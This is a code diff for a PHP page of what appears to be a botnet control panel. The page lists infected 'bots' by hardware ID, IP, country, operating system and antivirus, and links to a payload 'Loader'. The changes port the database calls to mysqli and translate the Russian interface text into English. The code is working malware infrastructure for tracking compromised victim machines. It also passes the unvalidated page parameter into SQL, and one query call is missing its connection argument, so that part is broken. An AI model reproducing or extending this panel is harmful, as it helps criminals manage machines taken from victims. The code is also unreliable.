@@ -1,9 +1,6 @@
 <?php
-    session_start();
-    if($_SESSION['auth'] != 'true'){
-        header("Location: index.php");
-        die();
-    }
+session_start();
+include('protect.php');
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -12,7 +9,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
-    <title></title>
+    <title>Table</title>
 
     <!-- Bootstrap -->
 
@@ -31,7 +28,7 @@
             <div class="container-fluid" style = "background-color: #ffffff">               
                 <ul class="nav navbar-nav">
 				<li><a href="loader.php" style="color: black">Loader</a></li>
-				<li><a href="logout.php" style="color: black">Выйти</a></li>
+				<li><a href="logout.php" style="color: black">Logout</a></li>
                 
                 </ul>
             </div>
@@ -39,14 +36,13 @@
         <div class="container">
            <div class="row">
                 <?php
-                include('config.php');
                 $logs = 0;       
-                $q = mysql_query("SELECT * FROM `bots` WHERE `checked`='false'");
+                $q = mysqli_query($mysqli, "SELECT * FROM `bots` WHERE `checked`='false'");
 
-                $logs = mysql_num_rows($q);
+                $logs = mysqli_num_rows($q);
                 for ($i = 0; $i < $logs; $i++)
                 {
-                    $log = mysql_fetch_assoc($q);              
+                    $log = mysqli_fetch_assoc($q);              
                 }
                 print 
                 '
@@ -64,27 +60,28 @@
                     <th style="color: black">ID</th>
                     <th style="color: black">HWID</th>
                     <th style="color: black">IP</th>
-                    <th style="color: black">Страна</th>
+                    <th style="color: black">Country</th>
+                    <th style="color: black">OS</th>
+                    <th style="color: black">AV</th>
                 </tr>					
                 </thead>
                 <tbody>
                     <?php
-                        include('config.php');
                         $workers;
                         $p1 = 0;
                         $p2 = 0;
                         if(isset($_GET['p'])){
                             $p1 = $_GET['p'];
                             $t1 = $_GET['p'] * 10;
-                            $workers = mysql_query("SELECT * FROM `bots` WHERE `checked` != 'true' ORDER BY `id` DESC LIMIT $t1, 10");
+                            $workers = mysqli_query("SELECT * FROM `bots` WHERE `checked` != 'true' ORDER BY `id` DESC LIMIT $t1, 10");
                         }
                         else{
-                            $workers = mysql_query("SELECT * FROM `bots` WHERE `checked` != 'true' ORDER BY `id` DESC LIMIT 10");
+                            $workers = mysqli_query($mysqli, "SELECT * FROM `bots` WHERE `checked` != 'true' ORDER BY `id` DESC LIMIT 10");
                         }
                         
-                        for ($i = 0; $i < mysql_num_rows($workers); $i++)
+                        for ($i = 0; $i < mysqli_num_rows($workers); $i++)
 						{
-                            $curr = mysql_fetch_assoc($workers);
+                            $curr = mysqli_fetch_assoc($workers);
 
                             echo
                             "
@@ -92,18 +89,20 @@
                             <td><strong>".$curr['id']."</strong></td>
                             <td><strong>".$curr['hwid']."</strong></td>
                             <td><strong>".$curr['ip']."</strong></td>
-                            <td><strong>".$curr['country']."</strong></td>    
+                            <td><strong>".$curr['country']."</strong></td> 
+                            <td><strong>".$curr['OS']."</strong></td>
+                            <td><strong>".$curr['AV']."</strong></td>  
                             </tr>
                             ";
                         }
-                         if(mysql_num_rows(mysql_query("SELECT * FROM `bots`")) > 10){
+                         if(mysqli_num_rows(mysqli_query($mysqli, "SELECT * FROM `bots`")) > 10){
                             $p11 = $p1 - 1;
                             $p1 += 1;
                             echo
                             "
                             <ul class=\"pager\">
-                                <li><a href=\"?p=$p11\">Назад</a></li>
-                                <li><a href=\"?p=$p1\">Дальше</a></li>
+                                <li><a href=\"?p=$p11\">Back</a></li>
+                                <li><a href=\"?p=$p1\">Next</a></li>
                             </ul>
                             ";
                         }
@@ -114,7 +113,7 @@
         </div>
 		
         <?php
-        mysql_close($dbcnx);
+        mysqli_close($mysqli);
         ?>
     </body>
 </html>
